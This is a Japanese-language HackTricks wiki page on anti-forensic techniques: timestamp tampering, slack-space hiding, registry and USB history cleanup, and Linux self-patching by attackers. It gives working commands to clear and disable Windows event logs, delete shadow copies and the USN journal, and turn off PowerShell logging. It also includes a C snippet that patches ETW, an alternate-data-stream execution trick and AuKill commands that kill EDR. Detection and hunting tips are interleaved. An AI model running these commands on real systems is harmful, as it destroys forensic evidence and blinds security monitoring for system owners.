# Anti-Forensic Techniques

{{#include ../../banners/hacktricks-training.md}}

## タイムスタンプ

攻撃者は、検出を避けるために**ファイルのタイムスタンプを変更**することがあります。\
タイムスタンプは、MFT内の属性 `$STANDARD_INFORMATION` \_\_ と \_\_ `$FILE_NAME` で確認できます。

どちらの属性にも、**Modification**、**access**、**creation**、**MFT registry modification** の4つのタイムスタンプがあります（MACEまたはMACB）。

**Windows explorer**や他のツールには、**`$STANDARD_INFORMATION`** の情報が表示されます。

### TimeStomp - Anti-forensic Tool

このツールは、**`$STANDARD_INFORMATION`** 内のタイムスタンプ情報を**変更**しますが、**`$FILE_NAME`** 内の情報は変更しません。そのため、**不審なアクティビティを特定**できます。

### Usnjrnl

**USN Journal**（Update Sequence Number Journal）は、ボリュームの変更を追跡するNTFS（Windows NT file system）の機能です。[**UsnJrnl2Csv**](https://github.com/jschicht/UsnJrnl2Csv) ツールを使うと、これらの変更を調査できます。

![TimeStomp - Anti-forensic Tool - Usnjrnl: USN Journal（Update Sequence Number Journal）は、ボリュームの変更を追跡するNTFS（Windows NT file system）の機能です。...](<../../images/image (801).png>)

前の画像は**ツール**の**出力**で、ファイルに対して**いくつかの変更が行われた**ことを確認できます。

### $LogFile

ファイルシステムに対する**すべてのメタデータ変更は**、[write-ahead logging](https://en.wikipedia.org/wiki/Write-ahead_logging)と呼ばれるプロセスで**記録されます**。記録されたメタデータは、NTFSファイルシステムのルートディレクトリにある `**$LogFile**` というファイルに保持されます。[LogFileParser](https://github.com/jschicht/LogFileParser) などのツールを使ってこのファイルを解析し、変更を特定できます。

![Usnjrnl - $LogFile: ファイルシステムに対するすべてのメタデータ変更は、write-ahead loggingと呼ばれるプロセスで記録されます。記録されたメタデータは、NTFSファイルシステムのルート...](<../../images/image (137).png>)

ここでも、ツールの出力から**いくつかの変更が行われた**ことを確認できます。

同じツールを使うと、タイムスタンプが**いつ変更されたか**を特定できます。

![Usnjrnl - $LogFile: 同じツールを使うと、タイムスタンプがいつ変更されたかを特定できます](<../../images/image (1089).png>)

- CTIME: ファイルの作成時刻
- ATIME: ファイルの変更時刻
- MTIME: ファイルのMFT registry modification
- RTIME: ファイルのアクセス時刻

### `$STANDARD_INFORMATION` と `$FILE_NAME` の比較

不審な変更が加えられたファイルを特定する別の方法として、両方の属性の時刻を比較し、**不一致**を探す方法があります。

### ナノ秒

**NTFS**のタイムスタンプの**精度**は**100ナノ秒**です。そのため、2010-10-10 10:10:**00.000:0000 のようなタイムスタンプを持つファイルは非常に不審**です。

### SetMace - Anti-forensic Tool

このツールは、`$STARNDAR_INFORMATION` と `$FILE_NAME` の両方の属性を変更できます。ただし、Windows Vista以降では、この情報を変更するには稼働中のOSが必要です。

## データ隠蔽

NFTSはクラスターと最小情報サイズを使用します。つまり、ファイルがクラスターを1つ半使用する場合、**残りの半分はファイルが削除されるまで使用されません**。そのため、**このスラックスペースにデータを隠す**ことができます。

slackerなど、この「隠された」スペースにデータを隠せるツールがあります。ただし、`$logfile` と `$usnjrnl` を分析すれば、データが追加されたことが分かる場合があります。

![SetMace - Anti-forensic Tool - データ隠蔽: slackerなど、この「隠された」スペースにデータを隠せるツールがあります。ただし、$logfile と $usnjrnl を分析すれば、...](<../../images/image (1060).png>)

その後、FTK Imagerなどのツールを使ってスラックスペースを取得できます。この種のツールは、難読化または暗号化された内容を保存する場合もあることに注意してください。

## UsbKill

これは、USBポートに何らかの変更が検出されると**コンピューターの電源を切る**ツールです。\
実行中のプロセスを調べ、**実行中の各Pythonスクリプトを確認する**ことで発見できる場合があります。

## Live Linux Distributions

これらのディストリビューションは**RAM上で実行されます**。検出できるのは、NTFSファイルシステムが書き込み権限付きでマウントされている場合に限られます。読み取り権限のみでマウントされている場合、侵入を検出することはできません。

## Secure Deletion

[https://github.com/Claudio-C/awesome-data-sanitization](https://github.com/Claudio-C/awesome-data-sanitization)

### Windowsの遅延自己削除

Windowsの実行イメージは、プロセスがアクティブな間ロックされることがあります。プロセスは削除処理を子プロセスの `cmd.exe` に渡し、タイマーとして `choice` を使ってから終了できます。遅延を設けることで、シェルが `del` を実行する前に元のプロセスがイメージのハンドルを解放できます。パスにスペースが含まれる場合は、フルパスを引用符で囲む必要があります。<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

```cmd
cmd.exe /C choice /C Y /N /D Y /T 6 ^>nul ^& Del /F /Q "<full-path-of-current-executable>"
```

この文字列を別の対話型 `cmd` プロンプトから入力するのではなく、`cmd.exe` の引数として直接渡す場合は、`^&` の代わりに `&` を、`^>nul` の代わりに `>nul` を使用してください。これによりディレクトリエントリは削除されますが、**安全な消去ではありません**。実行履歴、タスク、ファイルシステムジャーナル、その他のフォレンジック痕跡は削除されません。コマンドラインに `choice /T`、`Del`、親プロセスのイメージパスを含む、短時間だけ起動する `cmd.exe` の子プロセスを探してください。<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

## Windows Configuration

フォレンジック調査を大幅に困難にするため、Windowsのログ記録方法をいくつか無効にできます。

### Disable Timestamps - UserAssist

これは、ユーザーが各実行ファイルを起動した日時を記録するレジストリキーです。

UserAssistを無効にするには、次の2つの手順が必要です。

1. UserAssistを無効にするため、`HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackProgs` と `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackEnabled` の両方を0に設定します。
2. `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\<hash>` のようなレジストリサブツリーを削除します。

### Disable Timestamps - Prefetch

Windowsシステムのパフォーマンス向上を目的として、実行されたアプリケーションの情報が保存されます。ただし、この情報はフォレンジック調査にも役立ちます。

- `regedit` を実行します
- ファイルパス `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SessionManager\Memory Management\PrefetchParameters` を選択します
- `EnablePrefetcher` と `EnableSuperfetch` の両方を右クリックします
- それぞれで「修正」を選択し、値を1（または3）から0に変更します
- 再起動します

### Disable Timestamps - Last Access Time

Windows NTサーバー上のNTFSボリュームからフォルダーを開くたびに、システムは各フォルダーの一覧にあるタイムスタンプフィールド（最終アクセス時刻）を**更新**します。頻繁に使用されるNTFSボリュームでは、これがパフォーマンスに影響することがあります。

1. レジストリエディター（Regedit.exe）を開きます。
2. `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem` に移動します。
3. `NtfsDisableLastAccessUpdate` を探します。存在しない場合は、このDWORDを追加し、値を1に設定すると、この処理が無効になります。
4. レジストリエディターを閉じ、サーバーを再起動します。

### Delete USB History

**USBデバイスのエントリ**はすべて、Windowsレジストリの**USBSTOR**キーに保存されています。このキーには、USBデバイスをPCやノートパソコンに接続するたびに作成されるサブキーが含まれています。このキーは H`KEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR` にあります。**これを削除すると**、USBの履歴が削除されます。\
[**USBDeview**](https://www.nirsoft.net/utils/usb_devices_view.html) ツールを使って、削除されたことを確認したり（または削除したり）することもできます。

USBに関する情報を保存するもう1つのファイルは、`C:\Windows\INF` 内の `setupapi.dev.log` です。これも削除する必要があります。

### Disable Shadow Copies

`vssadmin list shadowstorage` でシャドウコピーを**一覧表示**します。\
`vssadmin delete shadow` を実行して**削除**します。

[こちら](https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html)で紹介されている手順に従い、GUIから削除することもできます。

シャドウコピーを無効にするには、[こちらの手順](https://support.waters.com/KB_Inf/Other/WKB15560_How_to_disable_Volume_Shadow_Copy_Service_VSS_in_Windows)に従います。

1. Windowsのスタートボタンをクリックし、テキスト検索ボックスに「services」と入力して、サービスプログラムを開きます。
2. 一覧から「Volume Shadow Copy」を見つけて選択し、右クリックして「プロパティ」を開きます。
3. 「スタートアップの種類」ドロップダウンメニューから「無効」を選択し、「適用」と「OK」をクリックして変更を確定します。

レジストリの `HKLM\SYSTEM\CurrentControlSet\Control\BackupRestore\FilesNotToSnapshot` を変更して、シャドウコピーでコピーするファイルを設定することもできます。

### Overwrite deleted files

- **Windowsツール**を使用できます。`cipher /w:C` を実行すると、Cドライブ内の利用可能な未使用ディスク領域からデータを削除するようcipherに指示します。
- [**Eraser**](https://eraser.heidi.ie) などのツールも使用できます。

### Delete Windows event logs

- Windows + R --> eventvwr.msc --> 「Windowsログ」を展開 --> 各カテゴリを右クリックし、「ログの消去」を選択します
- `for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"`
- `Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }`

### Disable Windows event logs

- `reg add 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\eventlog' /v Start /t REG_DWORD /d 4 /f`
- サービスの項目で「Windows Event Log」サービスを無効にします
- `WEvtUtil.exec clear-log` または `WEvtUtil.exe cl`

### Disable $UsnJrnl

- `fsutil usn deletejournal /d c:`

---

## Advanced Logging & Trace Tampering (2023-2025)

### PowerShell ScriptBlock/Module Logging

最近のWindows 10/11およびWindows Serverでは、`Microsoft-Windows-PowerShell/Operational`（イベント4104/4105/4106）に**詳細なPowerShellフォレンジック痕跡**が保存されます。  
攻撃者は、その場でこれらを無効化したり消去したりできます。

```powershell
# Turn OFF ScriptBlock & Module logging (registry persistence)
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\PowerShell\\3\\PowerShellEngine" \
                 -Name EnableScriptBlockLogging -Value 0 -PropertyType DWord -Force
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging" \
                 -Name EnableModuleLogging -Value 0 -PropertyType DWord -Force

# In-memory wipe of recent PowerShell logs
Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' |
  Remove-WinEvent               # requires admin & Win11 23H2+
```

Defenderは、これらのレジストリキーの変更と、PowerShellイベントの大量削除を監視する必要があります。

### ETW (Event Tracing for Windows) Patch

Endpoint security製品はETWに大きく依存しています。2024年に広く使われた回避手法は、メモリ内の`ntdll!EtwEventWrite`/`EtwEventWriteFull`にパッチを適用し、イベントを出力せずにすべてのETW呼び出しが`STATUS_SUCCESS`を返すようにするものです:<sup>[[5]](#references)</sup>

```c
// 0xC3 = RET on x64
unsigned char patch[1] = { 0xC3 };
WriteProcessMemory(GetCurrentProcess(),
                   GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite"),
                   patch, sizeof(patch), NULL);
```

Public PoC（例: `EtwTiSwallow`）は、同じプリミティブを PowerShell または C++ で実装しています。  
パッチは**プロセス内に限定される**ため、ほかのプロセス内で動作する EDR は見逃す可能性があります。<sup>[[5]](#references)</sup>
検出: メモリ上の `ntdll` とディスク上の `ntdll` を比較するか、ユーザーモードに入る前にフックします。

### Alternate Data Streams (ADS) の復活

2023年のマルウェアキャンペーン（例: **FIN12** の loader）では、従来のスキャナーの目を逃れるため、第2段階のバイナリを ADS 内に配置する手法が確認されています。

```cmd
rem Hide cobalt.bin inside an ADS of a PDF
type cobalt.bin > report.pdf:win32res.dll
rem Execute directly
wmic process call create "cmd /c report.pdf:win32res.dll"
```

`dir /R`、`Get-Item -Stream *`、または Sysinternals `streams64.exe` でストリームを列挙します。
ホストファイルを FAT/exFAT にコピーするか、SMB 経由でコピーすると隠しストリームが削除されるため、調査担当者がペイロードを復元する手段として利用できます。

### BYOVD & “AuKill” (2023)

Bring-Your-Own-Vulnerable-Driver は、ランサムウェア侵入時の**anti-forensics**に常用されるようになりました。  
オープンソースツールの **AuKill** は、署名済みながら脆弱なドライバー（`procexp152.sys`）を読み込み、暗号化とログ破壊の**前に**EDR やフォレンジックセンサーを一時停止または終了します:<sup>[[1]](#references)</sup>

```cmd
AuKill.exe -e "C:\\Program Files\\Windows Defender\\MsMpEng.exe"
AuKill.exe -k CrowdStrike
```

その後、driver は削除され、痕跡は最小限に抑えられます。<sup>[[1]](#references)</sup>  
緩和策: Microsoft vulnerable-driver blocklist（HVCI/SAC）を有効にし、ユーザーが書き込み可能なパスからの kernel-service 作成を検知して警告します。

---

## Linux Anti-Forensics: Self-PatchingとCloud C2（2023–2025）

### 検知を減らすために侵害したサービスをSelf-Patchingする（Linux）
攻撃者は、サービスを悪用した直後に「self-patch」するケースを増やしています。これにより、再悪用を防ぐと同時に、脆弱性ベースの検知を抑制します。脆弱なコンポーネントを最新の正規のupstreamバイナリ/JARに置き換えることで、永続化とC2を維持したまま、scannerにはホストがパッチ適用済みと報告させる手法です。<sup>[[3]](#references)</sup>

例: Apache ActiveMQ OpenWire RCE（CVE‑2023‑46604）。<sup>[[3]](#references)[[4]](#references)</sup>
- 悪用後、攻撃者はMaven Central（repo1.maven.org）から正規のJARを取得し、ActiveMQのインストール先にある脆弱なJARを削除して、brokerを再起動しました。
- これにより、初期のRCEを塞ぎつつ、ほかの足がかり（cron、SSH設定の変更、別個のC2 implant）を維持しました。

運用例（参考例）
```bash
# ActiveMQ install root (adjust as needed)
AMQ_DIR=/opt/activemq
cd "$AMQ_DIR"/lib

# Fetch patched JARs from Maven Central (versions as appropriate)
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-client/5.18.3/activemq-client-5.18.3.jar
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-openwire-legacy/5.18.3/activemq-openwire-legacy-5.18.3.jar

# Remove vulnerable files and ensure the service uses the patched ones
rm -f activemq-client-5.18.2.jar activemq-openwire-legacy-5.18.2.jar || true
ln -sf activemq-client-5.18.3.jar activemq-client.jar
ln -sf activemq-openwire-legacy-5.18.3.jar activemq-openwire-legacy.jar

# Apply changes without removing persistence
systemctl restart activemq || service activemq restart
```

Forensic/hunting tips
- 未予定のバイナリ/JAR置き換えがないか、サービスディレクトリを確認する:
  - Debian/Ubuntu: `dpkg -V activemq` を実行し、ファイルのハッシュ/パスをリポジトリミラーと比較する。
  - RHEL/CentOS: `rpm -Va 'activemq*'`
  - ディスク上に存在するものの、パッケージマネージャーが管理していないJARのバージョンや、事前の承認なく更新されたシンボリックリンクを探す。
- タイムライン: `find "$AMQ_DIR" -type f -printf '%TY-%Tm-%Td %TH:%TM %p\n' | sort` を使い、ctime/mtimeと侵害期間を照合する。
- Shell history/process telemetry: 初回の侵害直後に `repo1.maven.org` や他のartifact CDNへ `curl`/`wget` した痕跡を探す。
- Change management: パッチ適用済みバージョンが存在するかだけでなく、誰が、なぜ「patch」を適用したのかを確認する。

### Bearer tokenを使うCloudサービスC2とanti-analysis stager
観測されたtradecraftでは、複数の長期C2経路とanti-analysis向けのパッケージングが組み合わされていた:<sup>[[3]](#references)</sup>
- sandboxingと静的解析を妨げる、パスワード保護されたPyInstaller ELF loader（例: 暗号化されたPYZ、一時的な `/_MEI*` 配下への展開）。
  - Indicators: `PyInstaller`、`pyi-archive`、`PYZ-00.pyz`、`MEIPASS` などの `strings` 検出結果。
  - Runtime artifacts: `/tmp/_MEI*` またはカスタムの `--runtime-tmpdir` パスへの展開。
- ハードコードされたOAuth Bearer tokenを使うDropbox経由のC2
  - Network markers: `Authorization: Bearer <token>` を伴う `api.dropboxapi.com` / `content.dropboxapi.com`。
  - 通常はファイルを同期しないサーバーワークロードからDropboxドメインへのHTTPS送信がないか、proxy/NetFlow/Zeek/Suricataで調査する。
- トンネリング（例: Cloudflare Tunnel `cloudflared`）を使った並行/バックアップC2。片方のチャネルがブロックされても制御を維持する。
  - Host IOCs: `cloudflared` プロセス/units、`~/.cloudflared/*.json` の設定、Cloudflare edgeへの送信443通信。

### アクセス維持のためのPersistenceと「hardening rollback」（Linuxの例）
攻撃者は、自己パッチ適用と永続的なアクセス経路を組み合わせることが多い:<sup>[[3]](#references)</sup>
- Cron/Anacron: 定期実行のため、各 `/etc/cron.*/` ディレクトリにある `0anacron` stubを編集する。
  - 調査:
    ```bash
    for d in /etc/cron.*; do [ -f "$d/0anacron" ] && stat -c '%n %y %s' "$d/0anacron"; done
    grep -R --line-number -E 'curl|wget|python|/bin/sh' /etc/cron.*/* 2>/dev/null
    ```
- SSH configuration hardening のロールバック: root ログインを有効化し、低権限アカウントのデフォルトシェルを変更する。
  - root ログインの有効化を探す:
    ```bash
    grep -E '^\s*PermitRootLogin' /etc/ssh/sshd_config
    # flag values like "yes" or overly permissive settings
    ```
  - システムアカウント（例: `games`）上で、不審な対話型シェルを探す。
    ```bash
    awk -F: '($7 ~ /bin\/(sh|bash|zsh)/ && $1 ~ /^(games|lp|sync|shutdown|halt|mail|operator)$/) {print}' /etc/passwd
    ```
- ランダムな短い名前（アルファベット8文字）の beacon artifacts がディスクに配置され、cloud C2 にも接続する:
  - 捜索:
    ```bash
    find / -maxdepth 3 -type f -regextype posix-extended -regex '.*/[A-Za-z]{8}$' \
      -exec stat -c '%n %s %y' {} \; 2>/dev/null | sort
    ```

防御側は、これらの痕跡を外部への露出やサービスのパッチ適用イベントと照合し、初期侵入を隠すために行われた、アンチフォレンジック目的の自己修復を明らかにする必要があります。

## References

- [1] [Sophos X-Ops – AuKill：EDRを無効化するために武器化された脆弱なドライバー（2023年3月）](https://news.sophos.com/en-us/2023/03/07/aukill-a-weaponized-vulnerable-driver-for-disabling-edr)
- [2] [Red Canary – ステルスのためのEtwEventWriteのパッチ適用：検出とハンティング（2024年6月）](https://redcanary.com/blog/etw-patching-detection)
- [3] [Red Canary – 永続化のためのパッチ適用：DripDropper Linuxマルウェアのクラウド内での活動](https://redcanary.com/blog/threat-intelligence/dripdropper-linux-malware/)
- [4] [CVE‑2023‑46604 – Apache ActiveMQ OpenWire RCE（NVD）](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)
- [5] [独自の.NETを隠す - ETW（Adam Chester / XPN）](https://blog.xpnsec.com/hiding-your-dotnet-etw/)
- [6] [FortiGuard Labs – 正規ソフトウェアに埋め込まれたSectopRATの亜種を解明](https://www.fortinet.com/blog/threat-research/uncovering-a-sectoprat-variant-embedded-in-legitimate-software)
- [7] [Microsoft Learn – choiceコマンド](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/choice)
- [8] [Microsoft Learn – delコマンド](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/del)
{{#include ../../banners/hacktricks-training.md}}
